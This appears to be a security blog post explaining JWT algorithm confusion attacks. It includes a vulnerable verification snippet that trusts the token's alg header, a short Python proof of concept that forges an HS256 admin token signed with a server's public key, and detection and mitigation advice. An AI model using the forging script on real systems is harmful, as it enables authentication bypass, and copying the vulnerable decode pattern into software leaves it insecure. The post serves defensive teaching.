---
title: "JWT Algorithm Confusion Attacks — A Deep Dive"
description: "How attackers exploit JWT library implementation flaws to forge authentication tokens, with real-world examples and mitigation strategies."
date: "2024-07-20"
tags: ["JWT", "Authentication", "Web Security", "Cryptography"]
featured: true
draft: false
---

## Introduction

JSON Web Tokens (JWT) are ubiquitous in modern web authentication. When implemented correctly,
they provide a stateless, tamper-proof mechanism for conveying claims between parties.
When implemented incorrectly, they can be catastrophically broken.

This post explores **algorithm confusion attacks** — a class of vulnerability arising from
flexible JWT libraries that trust the `alg` header value provided by the client.

## How JWT Verification Works

A JWT consists of three base64url-encoded parts:

```
header.payload.signature
```

The header specifies the signing algorithm:

```json
{
  "alg": "RS256",
  "typ": "JWT"
}
```

A vulnerable library might do this:

```python
# VULNERABLE: trusts the alg from the token header
algorithm = jwt.decode_header(token)["alg"]
jwt.decode(token, public_key, algorithms=[algorithm])
```

## The Attack

If the server uses RS256 (RSA asymmetric), its **public key is often publicly accessible**
via a JWKS endpoint. An attacker can:

1. Fetch the public key
2. Change the `alg` header to `HS256` (HMAC symmetric)  
3. Sign the forged payload with the **public key as the HMAC secret**
4. The server verifies the HMAC using the same public key — **verification succeeds**

```python
import jwt, requests

# Step 1: Get the public key
jwks = requests.get("https://target.com/.well-known/jwks.json").json()
public_key = extract_pem(jwks["keys"][0])

# Step 2 & 3: Forge the token
malicious_payload = {"sub": "admin", "role": "superuser"}
forged = jwt.encode(malicious_payload, public_key, algorithm="HS256")

# Step 4: Use it
resp = requests.get("/api/admin", headers={"Authorization": f"Bearer {forged}"})
```

## Detection

Look for this pattern in server logs:

```
POST /api/auth/verify alg=HS256 sub=admin 200 OK
```

When you normally issue RS256 tokens, an `alg=HS256` with elevated privileges is suspicious.

## Mitigation

> **Rule**: Never trust the algorithm from the token. Hardcode the expected algorithm.

```python
# SECURE: hardcoded algorithm
decoded = jwt.decode(token, public_key, algorithms=["RS256"])
```

Additionally:
- Use a well-maintained library (python-jwt ≥ 2.x, jsonwebtoken ≥ 9.x)
- Validate the `typ` claim
- Implement short expiration times
- Log and alert on algorithm mismatches

## References

- [RFC 7519 — JSON Web Token](https://tools.ietf.org/html/rfc7519)
- [PortSwigger JWT Attack Labs](https://portswigger.net/web-security/jwt)
- CVE-2022-21449 (ECDSA signature verification bypass in Java)
